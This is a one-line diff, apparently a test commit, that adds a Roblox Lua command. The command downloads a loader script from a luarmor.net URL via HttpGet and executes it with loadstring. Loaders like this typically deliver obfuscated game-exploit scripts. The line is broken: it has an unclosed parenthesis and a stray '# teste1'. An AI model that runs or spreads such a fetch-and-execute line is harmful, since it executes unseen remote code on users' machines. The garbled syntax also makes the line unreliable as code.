@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a7b5616e0dba9debf9d1d30cc2ceee9f.lua"))(# teste1
